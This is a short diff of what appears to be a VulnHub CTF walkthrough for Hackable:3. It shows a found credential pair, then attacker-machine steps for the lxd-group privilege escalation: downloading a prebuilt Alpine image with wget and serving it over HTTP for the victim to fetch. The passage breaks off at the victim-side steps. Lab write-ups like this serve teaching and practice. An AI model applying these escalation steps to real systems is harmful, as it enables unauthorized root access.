@@ -44,7 +44,7 @@ hackable3:TrOLLED_3
 we found out that lxd from id command
 
 in our attacker machine ---> 
-git clone https://github.com/saghul/lxd-alpine-builder.git
+wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Hackable%3A3/alpine-v3.13-x86_64-20210218_0139.tar.gz
 python3 -m http.server 80
 
 in victim machine --->
